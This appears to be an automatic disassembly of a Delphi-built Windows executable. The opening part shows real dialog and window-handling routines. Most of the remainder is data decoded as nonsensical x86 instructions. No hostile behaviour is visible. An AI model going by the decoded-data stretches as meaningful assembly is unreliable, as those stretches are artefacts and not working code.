mov [ eax ] esi
xor edi edi
sub_4322a0
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x80 ]
test eax eax
je r-xdata
mov [ ebx + 0x90 ] 0x100
mov [ ebx + 0xa4 ] sub_4320dc
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_449498
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0x208 ] ebx
lea eax [ esi + 0x20c ]
push eax
push sub_432264
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ ebx + 0x68 ]
call sub_44d7a4
mov [ ebx + 0x88 ] eax
xor eax eax
mov esi rw-data
push eax
call BringWindowToTop
mov al 0x1
pop esi
pop ebx
retn
jae r-xdata
and edx 0x7f
bt [ ebx + 0x58 ] edx
inc eax
add esi 0x4
cmp al 0xd
jne r-xdata
mov edx [ esi ]
or [ ebx + 0x90 ] edx
mov edx eax
cmp dl 0xf
ja r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov [ rw-data ] ebx
lea eax [ ebx + 0x84 ]
push eax
call [ ebx + 0x64 ]
mov esi eax
mov [ ebx + 0x80 ] esi
test esi esi
setne al
pop esi
pop ebx
retn
or [ ebx + 0x90 ] 0x200
mov eax [ ebx + 0x44 ]
mov [ ebx + 0xa8 ] eax
sub_4323b4
push ebx
add esp 0xfffffff0
mov ebx edx
mov edx [ eax + 0x5a ]
mov [ ebx ] edx
mov edx [ eax + 0x5e ]
mov [ ebx + 0x4 ] edx
mov edx [ eax + 0x80 ]
test edx edx
je r-xdata
add esp 0x10
pop ebx
retn
push esp
push edx
call GetWindowRect
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
sub_43241c
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_431964
test al al
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov edx [ ebx ]
cmp edx [ rw-data ]
jne r-xdata
mov edx [ ebx + 0x8 ]
lea ecx [ edi + 0x84 ]
cmp edx ecx
jne r-xdata
mov ax [ r-xdata ]
mov [ edi + 0x58 ] ax
xor ebx ebx
mov esi rw-data
inc ebx
add esi 0x4
cmp bl 0xd
jne r-xdata
mov eax ebx
cmp al 0xf
ja r-xdata
mov eax [ edi + 0x90 ]
and eax [ esi ]
je r-xdata
mov eax [ edi + 0x90 ]
test al 0x8
je r-xdata
and eax 0x7f
bts [ edi + 0x58 ] eax
test al 0x30
je r-xdata
mov eax edi
mov si 0xffed
call sub_40358c
jmp r-xdata
test al 0x40
je r-xdata
mov eax edi
mov si 0xffec
call sub_40358c
jmp r-xdata
mov al 0x1
push esp
mov eax [ edi + 0x80 ]
push eax
call GetWindowRect
mov eax [ esp ]
mov [ edi + 0x5a ] eax
mov eax [ esp + 0x4 ]
mov [ edi + 0x5e ] eax
xor eax eax
mov [ edi + 0x80 ] eax
push 0x0
push 0x0
push 0xb021
mov eax [ edi + 0x68 ]
call sub_44d7a4
push eax
call PostMessageA
xor eax eax
mov [ edi + 0x68 ] eax
sub_432514
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4045e0
mov edx eax
lea eax [ ebx + 0xac ]
mov ecx 0xff
call sub_408c74
pop esi
pop ebx
retn
sub_432538
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4045e0
mov edx eax
lea eax [ ebx + 0x1ac ]
mov ecx 0xff
call sub_408c74
pop esi
pop ebx
retn
sub_43255c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_432164
mov eax ReplaceTextA
mov [ esi + 0x64 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_432640
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_409258
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_432782
dec eax
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 8 ] dh
inc edi
add [ eax + 0x485c ] ah
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4327e6
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4327ed
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0xb
mov edx [ r-xdata ]
call sub_404bd4
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
sub_4327f0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403ef4
call sub_432640
mov eax [ r-xdata ]
call sub_41ac88
mov eax [ r-xdata ]
call sub_41ad28
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41acd4
sub_432c7d
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al [ eax ]
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0026 ] al
outsb
push ebx
je r-xdata
dec ebp
outsd
jbe r-xdata
inc ebx
jb r-xdata
popad
add al 0x25
inc esp
add al ah
add [ eax ] al
jmp eax
or [ edx + 0x73 ] esp
bound esi [ ebx + 0x46 ]
jb r-xdata
jo r-xdata
inc esp
jb r-xdata
add [ 0x6f427362 ] al
insb
push ebx
push 0x1657061
add [ eax ] al
add [ eax ] al
push es
add [ eax ] al
add [ ebp + ebp + 0x43 ] ch
inc esp
outsd
arpl [ ebx + 0x50 ] bp
daa
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x65 ] 0x4273620c
add [ esi + ebp + 0x16c0043 ] dh
add [ eax ] al
dec eax
aaa
push esp
outsd
insd
or [ gs : edx + 0x73 ] esp
js r-xdata
inc edx
outsd
lea eax [ bx + si ]
xor al 0x2d
inc ebx
add [ ebx ] al
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
add ah cl
je r-xdata
add al cl
bound eax [ eax + eax + 0xc ]
push 0x44
add [ eax + 0x69 ] dh
inc esp
add [ eax + 0x10004472 ] bl
bound eax [ eax + eax + 0x14 ]
bound eax [ eax + eax + 0x10 ]
xchg edx eax
inc esp
add [ edx + edx * 4 ] bh
inc esp
add [ ebp + ebp * 2 + 0x44 ] dl
add [ ebx + 0x6ee00044 ] cl
inc esp
add [ eax + 0x6e ] bl
inc esp
add [ ecx + esi * 2 + 0x44 ] ch
add [ eax ] bl
jo r-xdata
xor eax [ eax ]
sub dl ch
inc esp
add [ eax - 0x70 ] bh
inc esp
add [ eax - 0x7c ] dh
inc esp
add [ eax - 0x44 ] dl
inc ecx
add [ eax - 0x70 ] al
outsd
insd
dec esp
imul ebp [ esi + 0x65 ] 0x4c73620a
je r-xdata
outsb
or al 0x62
jae r-xdata
insb
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x65 ] al
inc esp
add [ esp + esi * 2 + 0x3f680044 ] ch
inc ebx
add [ esi ] al
push esp
inc edx
jbe r-xdata
or [ eax ] al
js r-xdata
add [ edx + eax * 4 ] al
inc esp
add al al
xchg edx eax
inc esp
add [ eax + 0x74 ] bl
inc esp
add [ eax ] bl
inc edx
inc edx
add ah ah
xor eax 0x3b6c0040
inc edx
add ah ch
imul ebp [ esi + 0x65 ] 0x5273620b
shr [ esi ] 0x43
outsd
je r-xdata
imul esp [ edi + 0x68 ] 0x6e694c74
or [ gs : edx + 0x73 ] ah
push ebx
jo r-xdata
outsb
or esp [ gs : edx + 0x73 ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] dh
sub eax 0x62090043
jae r-xdata
dec eax
and al 0x44
add [ eax + eax ] dh
[ eax - 0x6c ]
inc esp
add [ ecx ] al
insb
nop
shr [ esi ] 0x43
add [ edi ] al
push es
push esp
inc edx
jbe r-xdata
mov al [ 0x61004423 ]
add [ eax ] al
outsb
or eax [ eax ]
add eax 0x67696c41
outsb
inc esp
add [ ebx ] bl
add bh bh
cwde
inc esp
add [ ecx ] al
inc esp
add [ esp + 0x44 ] dl
add al al
arpl [ eax + eax + 0x6c ] ax
insd
inc esp
add [ eax ] dh
inc edx
inc edx
add [ eax ] bl
aas
inc edx
add [ eax ] dl
aas
mov esp 0x90400041
arpl [ ebp + 0x72 ] sp
or [ ebp + 0x78 ] al
je r-xdata
dec esp
outsd
ja r-xdata
inc ebx
add [ eax + 0x1 ] ch
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b000d ] al
outsd
outsb
jae r-xdata
insb
and al 0x2e
inc ebx
add [ eax + edi ] bh
inc esp
add [ ebx ] dl
add [ eax ] cl
inc ebp
js r-xdata
add [ eax ] ch
xor eax [ eax ]
inc esp
je r-xdata
push edx
or esp [ edx + 0x73 ]
jb r-xdata
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x53080010 ] al
push 0x6948776f
outsb
je r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ edx - 0x7010000 ] bl
add [ eax ] al
inc ebx
je r-xdata
inc edx
add [ eax ] bh
inc edx
inc edx
add [ ebp + edi + 0x7f080043 ] dl
inc esp
add [ edi + edi * 2 ] al
inc esp
add ah dl
jg r-xdata
adc [ edi ] bh
insb
jae r-xdata
jae r-xdata
or [ fs : edx + 0x73 ] ah
push edx
popad
imul esi [ ebx + 0x65 ] 0x78450864
je r-xdata
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
hlt
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x32 ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
xor al [ ebx ]
dec esp
xor al [ ebx ]
and al 0x2
add [ eax ] al
push 0x18004438
inc edx
inc edx
add ah ah
xor eax 0x3b6c0040
inc edx
add ah ch
xor eax 0xb2e40040
inc esp
insb
jae r-xdata
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add bh bh
add [ esi ] bh
inc ebx
sub eax 0x1680043
add bh bh
aam 0x70
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ esi ] cl
push eax
popad
jb r-xdata
jo r-xdata
add bh bh
clc
insb
jae r-xdata
inc esp
add [ eax ] eax
add [ eax + 0x37 ] cl
inc ebx
xor eax 0x83980040
inc esp
in al dx
je r-xdata
inc esp
add [ eax - 0x44 ] dl
inc ecx
add [ eax - 0x70 ] al
inc esp
add [ esp + 0x44 ] dl
add [ eax - 0x69 ] ah
inc esp
add [ ebp + ebp * 2 + 0x44 ] ch
add [ eax ] dh
inc edx
inc edx
add [ eax ] bl
aas
inc edx
add [ eax ] dl
aas
inc edx
add [ eax ] bh
inc edx
inc edx
add ah al
inc ebx
inc ebx
add al dl
fld [ eax + eax + 0x18 ]
dec edx
inc ebx
add [ eax ] bh
loop r-xdata
popad
insb
pop eax
mov [ ecx ] eax
cmp [ eax ] al
add bh bh
inc eax
add [ eax ] al
add bh bh
js r-xdata
add [ eax ] al
adc [ eax ] al
inc eax
add [ eax ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + esi + 0x43 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
imul ebp [ esi + 0x74 ] r-xdata
push 0xff0001
adc [ eax ] eax
add eax 0x6c797453
add [ gs : eax ] dl
inc eax
add [ edi ] dl
add bh bh
movsb [ edi ] [ esi ]
outsb
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
[ eax + 0x1004464 ]
add [ eax + 0x1c ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
inc ebx
inc ebx
insb
jae r-xdata
add [ esi + edx * 8 - 0x2ea7ffbc ] dl
inc esp
add [ eax - 0x2a ] bh
inc esp
add [ eax + ecx * 2 - 0x6193ffbd ] al
inc esp
add [ esp + ebp * 4 ] cl
inc esp
add [ eax - 0xbffbcbc ] cl
test al 0x44
add [ edi ] ah
inc esp
add [ esp + ebp * 4 - 0x5357ffbc ] ah
inc esp
add [ eax - 0x55 ] ah
inc esp
add [ eax ] cl
stosd [ edi ]
inc esp
add [ eax - 0x4bffbb29 ] bh
hlt
add al cl
bound eax [ eax + eax + 0x4c ]
fadd [ eax + eax + 0x6c ]
fadd [ eax + eax + 0x4c ]
aad 0x44
add [ eax ] dl
bound eax [ eax + eax + 0x14 ]
bound eax [ eax + eax + 0x10 ]
xchg edx eax
inc esp
add [ edx + edx * 4 ] bh
inc esp
add [ ebp + ebp * 2 + 0x44 ] dl
add [ ebx + 0x6ee00044 ] cl
inc esp
add [ eax + 0x6e ] bl
inc esp
add [ ecx + esi * 2 + 0x44 ] ch
add [ eax ] bl
jo r-xdata
cwde
inc ebx
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070004 ] al
outsb
push esp
imul ebp [ ebp + 0x65 ] 0x43315472
add [ eax ] al
add [ eax ] al
je r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
xchg esp eax
adc [ eax ] al
xor [ eax ] al
add bh bh
mov [ ebx + 0x43 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x3
add [ eax ] al
add eax [ eax ]
or [ ecx + 0x6e ] cl
add [ eax - 0x44 ] dl
inc ecx
add al bh
inc edx
add ah al
cmp eax 0x3f080042
inc edx
add [ eax ] al
inc eax
inc edx
add [ eax ] dh
inc edx
inc edx
add [ eax ] bl
aas
inc edx
add [ eax ] dl
aas
inc edx
add [ eax ] bh
inc edx
inc edx
add al dh
inc ecx
inc ebx
add [ ecx ] al
add bh ch
push [ eax + 0x6004343 ]
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x30849072
inc ebx
add [ edi ] al
push es
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x43304072
add [ esi + ebx * 4 ] dl
inc ecx
add [ 0x78450800 ] al
je r-xdata
inc ecx
add [ eax ] ah
inc edx
inc ebx
add [ eax + 0x30 ] bh
inc ebx
add [ eax + eax ] al
add [ eax ] bl
popfd
inc ecx
add [ eax ] bl
inc edx
inc edx
add ah ah
xor eax 0x3b6c0040
inc edx
add ah ch
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
inc eax
inc edx
inc ebx
add [ edi * 4 + 0x3e200041 ] dh
inc edx
inc ebx
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
and [ 0x6e4f0b00 ] 0x53
je r-xdata
shl [ eax + 0x2d ] 0x43
add [ ebx ] al
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
add [ esp + esi * 8 + 0x4a440044 ] dh
inc ebx
add ah bh
rol [ eax + eax + 0x24 ] cl
xlat
inc esp
add [ eax + 0x46 ] dh
inc ebx
add [ edi ] al
add [ ebx ] bh
mov al 0x12
mov al 0x10
mov al 0x32
mov al 0x47
add [ eax ] bh
mov al 0xca
add [ eax - 0x3fffbb4f ] al
xchg edx eax
inc esp
add al bl
aad 0x44
inc esp
add [ eax ] al
nop
inc esp
add [ eax ] al
sub eax 0x1690043
add bh bh
sbb al 0x3e
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sldt [ 0x70616853 ]
add [ gs : eax ] dl
inc eax
add [ ecx - 0x2b010000 ] bl
jo r-xdata
inc ebp
js r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x90656c62
inc eax
xor [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ eax ] dh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x30 ] dh
add [ eax + 0x44 ] dl
add [ eax + 0x1 ] al
add [ eax + esi * 2 + 0x44 ] bl
add [ eax - 0x80000000 ] al
adc [ eax ] al
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
inc ebx
sub_433152
inc esp
add [ edx - 0x5553ffbc ] bh
inc esp
add [ eax - 0x44 ] dl
inc ecx
add [ eax - 0x70 ] al
inc esp
add [ esp + 0x44 ] dl
add [ eax - 0x69 ] ah
inc esp
add [ ebp + ebp * 2 + 0x44 ] ch
add [ eax ] dh
inc edx
inc edx
add [ eax ] bl
aas
inc edx
add [ eax ] dl
aas
inc edx
add [ eax ] bh
inc edx
inc edx
add ah al
inc ebx
inc ebx
add al dl
fld [ eax + eax + 0x18 ]
dec edx
inc ebx
add [ eax ] bh
loop r-xdata
add [ esi + edx * 8 - 0x2ea7ffbc ] dl
inc esp
add [ eax - 0x2a ] bh
inc esp
add [ eax + ecx * 2 - 0x6193ffbd ] al
inc esp
add [ esp + ebp * 4 ] cl
inc esp
add [ eax - 0xbffbcbc ] cl
test al 0x44
add [ edi ] ah
inc esp
add [ esp + ebp * 4 - 0x5357ffbc ] ah
inc esp
add [ eax - 0x55 ] ah
inc esp
add [ eax ] cl
stosd [ edi ]
inc esp
add [ eax - 0x4bffbb29 ] bh
hlt
add al cl
bound eax [ eax + eax + 0x4c ]
fadd [ eax + eax + 0x6c ]
fadd [ eax + eax + 0x4c ]
aad 0x44
add [ eax ] dl
bound eax [ eax + eax + 0x14 ]
bound eax [ eax + eax + 0x10 ]
xchg edx eax
inc esp
add [ edx + edx * 4 ] bh
inc esp
add [ ebp + ebp * 2 + 0x44 ] dl
add [ ebx + 0x6ee00044 ] cl
inc esp
add [ eax + 0x6e ] bl
inc esp
add [ ecx + esi * 2 + 0x44 ] ch
add [ eax ] bl
jo r-xdata
add [ esp + esi * 8 + 0x4a440044 ] dh
inc ebx
add ah bh
rol [ eax + eax + 0x24 ] cl
xlat
inc esp
add [ eax + 0x46 ] dh
inc ebx
add [ edi ] al
add [ ebx ] bh
mov al 0x12
mov al 0x10
mov al 0x32
mov al 0x47
add [ eax ] bh
mov al 0xca
add [ eax - 0x3fffbb4f ] al
xchg edx eax
inc esp
add al bl
aad 0x44
sub_4332ce
inc esp
add [ edx - 0x5553ffbc ] bh
inc esp
add [ eax - 0x44 ] dl
inc ecx
add [ eax - 0x70 ] al
inc esp
add [ esp + 0x44 ] dl
add [ eax - 0x69 ] ah
inc esp
add [ ebp + ebp * 2 + 0x44 ] ch
add [ eax ] dh
inc edx
inc edx
add [ eax ] bl
aas
inc edx
add [ eax ] dl
aas
inc edx
add [ eax ] bh
inc edx
inc edx
add ah al
inc ebx
inc ebx
add al dl
fld [ eax + eax + 0x18 ]
dec edx
inc ebx
add [ eax ] bh
loop r-xdata
add [ esi + edx * 8 - 0x2ea7ffbc ] dl
inc esp
add [ eax - 0x2a ] bh
inc esp
add [ eax + ecx * 2 - 0x6193ffbd ] al
inc esp
add [ esp + ebp * 4 ] cl
inc esp
add [ eax - 0xbffbcbc ] cl
test al 0x44
add [ edi ] ah
inc esp
add [ esp + ebp * 4 - 0x5357ffbc ] ah
inc esp
add [ eax - 0x55 ] ah
inc esp
add [ eax ] cl
stosd [ edi ]
inc esp
add [ eax - 0x4bffbb29 ] bh
hlt
add al cl
bound eax [ eax + eax + 0x4c ]
fadd [ eax + eax + 0x6c ]
fadd [ eax + eax + 0x4c ]
aad 0x44
add [ eax ] dl
bound eax [ eax + eax + 0x14 ]
bound eax [ eax + eax + 0x10 ]
xchg edx eax
inc esp
add [ edx + edx * 4 ] bh
inc esp
add [ ebp + ebp * 2 + 0x44 ] dl
add [ ebx + 0x6ee00044 ] cl
inc esp
add [ eax + 0x6e ] bl
inc esp
add [ ecx + esi * 2 + 0x44 ] ch
add [ eax ] bl
jo r-xdata
add [ esp + esi * 8 + 0x4a440044 ] dh
inc ebx
add ah bh
rol [ eax + eax + 0x24 ] cl
xlat
inc esp
add [ eax + 0x46 ] dh
inc ebx
add [ esi ] al
push esp
push eax
popad
outsb
insb
nop
test al 0x33
inc ebx
add [ edi ] al
push es
push esp
push eax
popad
outsb
insb
shl [ edx ] 0x1
inc ebx
add [ edx + esi + 0x43 ] bl
add [ edx ] al
or [ ebp + 0x78 ] al
je r-xdata
add [ eax - 0x3fffbb4f ] al
xchg edx eax
inc esp
add al bl
aad 0x44
imul esp [ edi + 0x6e ] 0x746e656d
mov al [ 0x61004423 ]
add [ eax ] al
je r-xdata
pop esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
insb
jae r-xdata
adc [ eax + 0x5f0041 ] cl
add bh bh
jo r-xdata
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
adc [ edx ] eax
add bh bh
clc
inc edi
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
str [ edx ]
inc edx
jbe r-xdata
add [ eax ] al
or al 0x0
or [ ecx + 0x6c ] eax
add [ eax + 0x1c ] bh
inc esp
add [ ebx ] bl
add bh bh
cwde
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
pushfd
xchg [ ecx ] eax
and [ edx ] al
add bh bh
in al dx
inc edi
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add dh bh
test al 0x70
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080012 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1865646f
xor al [ eax + eax + 0x18 ]
add al [ eax ]
dec [ eax + ecx * 2 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax [ eax ]
or eax [ edx + 0x6f ]
add [ eax ] al
adc [ edx ] 0x0
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0x32186564
inc esp
add [ eax ] bl
insb
dec ecx
outsb
outsb
jb r-xdata
add [ eax ] al
call [ esi ]
jb r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
xor al [ eax + eax + 0x12 ]
add al [ eax ]
call [ eax + ecx * 2 ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
adc [ eax ] al
or al [ edx + 0x65 ]
jbe r-xdata
add [ edi + 0x38ff0001 ] ah
fiadd [ eax + eax + 0x1 ]
and al 0x44
add [ eax + eax ] dh
[ eax - 0x6c ]
inc esp
add [ ecx ] al
add [ 0x6f6c6f43 ] al
jb r-xdata
add [ eax + 0x71 ] al
inc esp
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add bh bh
push ss
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
add [ eax ] al
adc al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
jb r-xdata
add [ ebx ] dl
add [ ebx ] cl
inc edx
outsd
insb
dec edi
jne r-xdata
add [ eax ] al
inc esp
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
inc esp
jb r-xdata
outsd
outsb
jae r-xdata
inc ebx
jb r-xdata
sbb al 0x2
add bh bh
push 0x1004348
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
adc [ eax ] al
test al 0x1
add bh bh
dec eax
retn
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb eax [ eax ]
or al [ edx + esi * 2 + 0x61 ]
add [ edx ] bh
add bh bh
jpe r-xdata
add [ eax ] al
add [ eax ] al
sbb al [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
pushad
sbb al 0x44
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x1b00ffff ] ah
fadd [ eax + eax + 0x8 ]
fld [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0017 ] al
je r-xdata
jbe r-xdata
adc [ eax ] eax
or al [ edx + 0x65 ]
xor eax [ eax + eax + 0x14 ]
add al [ eax ]
push [ eax ]
dec eax
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
[ 0x1ff0002 ]
jae r-xdata
inc ebx
jne r-xdata
xor eax [ eax + eax + 0x10 ]
inc eax
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050018 ] al
je r-xdata
add [ eax ] al
insb
dec eax
and eax [ eax + eax - 0x7c ]
outsd
inc esp
add [ edi + ebp * 2 - 0x707fffbc ] dh
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070015 ] al
popad
jo r-xdata
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add [ ecx + ebp * 8 + 0xbc0044 ] al
add dh bh
pop ds
add al [ eax ]
inc [ eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50100023 ] al
popad
insb
push edx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ ebx ] cl
inc esi
jne r-xdata
add bh bh
sbb eax 0x1ff0002
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
push cs
push ebp
jae r-xdata
add [ ecx ] al
imul ebp [ edi + 0x6e ] r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edx ] cl
outsb
je r-xdata
outsb
imul ebp [ esi + 0x74 ] r-xdata
push 0x78ff0000
jo r-xdata
sbb al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
and al [ eax + eax - 0x65 ]
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add bh bh
and al 0x71
inc esp
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
add [ ecx ] 0x0
add [ eax ] al
and eax 0x61500b00
jb r-xdata
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
add [ eax ] al
add [ eax ] al
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
test cl ch
inc esp
add [ eax + eax + 0x21ffe00 ] bh
add bh bh
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
adc [ eax + 0x61 ] dl
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
push cs
push eax
popad
jb r-xdata
add [ eax + 0x4470 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040020 ] al
outsd
outsb
je r-xdata
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
imul ebp [ esi + 0x74 ] r-xdata
inc eax
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
outsb
je r-xdata
je r-xdata
jne r-xdata
add [ ecx ] 0x0
add [ eax ] al
daa
add [ esi ] cl
outsb
je r-xdata
inc esp
add [ ecx ] al
je r-xdata
outsb
adc [ eax ] al
push ds
add al [ eax ]
[ esi ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
push es
dec esp
outsd
arpl [ ebx + 0x65 ] bp
add [ fs : eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
xor [ eax ] 0x0
jpe r-xdata
movsb [ edi ] [ esi ]
outsb
inc esp
